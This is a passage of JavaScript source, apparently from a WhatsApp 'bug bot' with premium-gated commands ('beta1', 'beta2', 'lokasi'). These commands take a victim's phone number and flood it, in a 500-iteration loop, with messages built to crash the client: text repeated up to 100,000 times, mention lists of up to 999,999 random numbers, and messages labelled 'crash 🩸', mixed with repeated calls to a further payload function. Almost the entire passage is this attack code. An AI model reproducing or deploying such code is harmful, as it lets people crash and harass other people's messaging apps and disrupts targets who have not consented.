              text: " \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" + "ꦾ".repeat(10000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 85000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "Halllo " + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 999999
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "🥴❗🥴 " + "ꦾ".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "Hallo " + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "Halllo " + "ꦾ".repeat(40000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "Halllo " + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await p.relayMessage(v71, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v71
            }
          });
          await f5(v71, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
        }
      }
      break;
    case "beta1":
    case "beta2":
    case "lokasi":
      {
        if (!v12) {
          return vF3("Fitur Khusus Premium!!");
        }
        if (!q) {
          return vF3("Gunakan Comand Berikut " + v7 + " 628xxx");
        }
        let v73 = q.replace(/[^0-9]/g, "");
        if (v73.startsWith("0")) {
          return vF3("Gunakan Nomor Dengan Kode Negara");
        }
        let v74 = v73 + "@s.whatsapp.net";
        if (v74 === "6281911317205@s.whatsapp.net") {
          return vF3("Target Salah!!");
        }
        vF3(" 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜ホ\n> 𝙅𝙚𝙙𝙖 𝟩 𝙈𝙚𝙣𝙞𝙩 𝘽𝙞𝙖𝙧 𝙂𝙖 𝙆𝙚𝙣𝙤𝙣‼️ ");
        for (let v75 = 0; v75 < 500; v75++) {
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "🔯☸️ꦾ" + "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝙑𝟤𓍯𓂃".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "Halllo " + "@6285929014979 ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ ㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\nㅤ ㅤ ㅤ \n\n\n\n\n".repeat(10000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(70000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝗞𝗶𝗹⃟ " + "ꦾ".repeat(40000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "Hallo " + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "Halllo " + "ꦾ".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 70000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "Halllo " + "@6285929014979".repeat(100000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await p.relayMessage(v74, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(10000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v74
            }
          });
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
          await f5(v74, Ptcp = true);
        }
      }
      break;
    case "hardui":
    case "hasilgpt":
      {
        if (!v12) {
          return vF3("Fitur Khusus Premium!!");
        }
